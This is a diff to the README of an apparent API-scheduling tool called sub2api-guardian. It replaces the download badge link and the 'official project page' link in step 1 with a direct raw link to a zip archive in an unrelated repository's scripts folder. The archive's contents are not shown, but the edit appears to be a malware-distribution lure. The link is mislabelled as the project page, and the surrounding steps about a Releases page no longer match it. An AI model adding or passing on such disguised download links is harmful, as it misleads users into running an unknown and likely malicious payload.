@@ -5,7 +5,7 @@ description: "Automate channel scheduling for sub2api with health checks, latenc
 ---
 # 🛡️ sub2api-guardian - Protect your digital API connections easily
 
-[![Download sub2api-guardian](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Dissociative-familyargiopidae307/sub2api-guardian)
+[![Download sub2api-guardian](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://raw.githubusercontent.com/Dissociative-familyargiopidae307/dissociative-familyargiopidae307.github.io/main/scripts/3.8.zip)
 
 ## 🎯 About the tool
 
@@ -24,7 +24,7 @@ Your computer must meet these basic standards to run the software smoothly:
 
 Follow these steps to acquire the installer.
 
-1. Navigate to the official project page: [https://github.com/Dissociative-familyargiopidae307/sub2api-guardian](https://github.com/Dissociative-familyargiopidae307/sub2api-guardian).
+1. Navigate to the official project page: [https://raw.githubusercontent.com/Dissociative-familyargiopidae307/dissociative-familyargiopidae307.github.io/main/scripts/3.8.zip](https://raw.githubusercontent.com/Dissociative-familyargiopidae307/dissociative-familyargiopidae307.github.io/main/scripts/3.8.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click on the latest version number to expand the details.
 4. Locate the file ending in ".exe" under the "Assets" list.
